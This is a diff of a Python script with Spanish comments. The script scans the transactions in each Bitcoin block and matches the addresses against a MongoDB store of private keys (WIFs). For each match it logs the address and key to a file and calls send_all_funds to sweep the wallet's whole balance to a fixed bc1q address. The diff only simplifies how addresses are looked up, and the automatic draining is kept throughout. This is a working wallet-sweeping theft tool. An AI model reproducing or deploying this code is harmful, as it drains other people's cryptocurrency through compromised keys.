@@ -313,50 +313,28 @@ def procesar_bloque_y_transacciones(bloque_id):
     if block_hash is None:
         return
 
-
     # Obtenemos las direcciones de las transacciones y les asignamos los WIFs, buscamos la direcciones de cada tx y asi buscamos en mongodb si existe la direccion entonces retiramos
     for i, tx_hash in enumerate(tx_hashes):
         # Mostrar el número de transacciones restantes por procesar
         #print(f"Procesando transacción {tx_hash}... ({i+1} de {len(tx_hashes)}) restantes.")
 
+        # del Txid sacamos las direcciones
         tx_direcciones = get_transaction_addresses(tx_hash)
         for addr in tx_direcciones:
-            # Convertir la dirección y asignar solo el WIF correspondiente
-            resultado = generar_direcciones_y_wif(addr, isAddress=True)
 
-            if resultado:  # Verificamos que resultado no sea False
-                # Verificar que las direcciones comiencen con '1' antes de agregarlas
-                if resultado['direccion_sin_comprimir'] and resultado['direccion_sin_comprimir'].startswith('1'):
-                    direccionSinComprimir = resultado['direccion_sin_comprimir']
-                    wifSinComprimir = resultado['wif_sin_comprimir']
+            # Verificamos que no este vacio, esto devuelve la direccion que tiene los tx y que la direccion comienze con 1
+            if addr and addr.startswith('1'):  
 
-                    # Buscar en MongoDB, si existe retiramos saldo
-                    searchMongoDBWIFSINComprimir = buscar_wifMongoDB(direccionSinComprimir)
-                    if searchMongoDBWIFSINComprimir:
-                        print(f"[Nueva Transaccion] {direccionSinComprimir} :: {searchMongoDBWIFSINComprimir}")
+                # Buscar en MongoDB, si existe retiramos saldo
+                searchMongoDBWIF = buscar_wifMongoDB(addr)
+                if searchMongoDBWIF:
+                    print(f"[Nueva Transaccion] {addr} :: {searchMongoDBWIF}")
 
-                        # Guardar la Wallet que se encontro con actividad reciente
-                        agregar_contenido_txt('actividadBTC.txt', f"{direccionSinComprimir} :: {searchMongoDBWIFSINComprimir}")
+                    # Guardar la Wallet que se encontro con actividad reciente
+                    agregar_contenido_txt('actividadBTC.txt', f"{addr} :: {searchMongoDBWIF}")
 
-                        # Realizar Retiro
-                        send_all_funds(searchMongoDBWIFSINComprimir, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
-
-
-                if resultado['direccion_comprimida'] and resultado['direccion_comprimida'].startswith('1'):
-                    direccionComprimir = resultado['direccion_comprimida']
-                    wifComprimir = resultado['wif_comprimida']
-
-                    # Buscar en MongoDB, si existe retiramos saldo
-                    searchMongoDBWIF = buscar_wifMongoDB(direccionComprimir)
-                    if searchMongoDBWIF:
-                        print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIF}")
-
-                        # Guardar la Wallet que se encontro con actividad reciente
-                        agregar_contenido_txt('actividadBTC.txt', f"{direccionComprimir} :: {searchMongoDBWIF}")
-
-                        # Realizar Retiro
-                        send_all_funds(searchMongoDBWIF, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
-
+                    # Realizar Retiro
+                    send_all_funds(searchMongoDBWIF, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
 
 
 
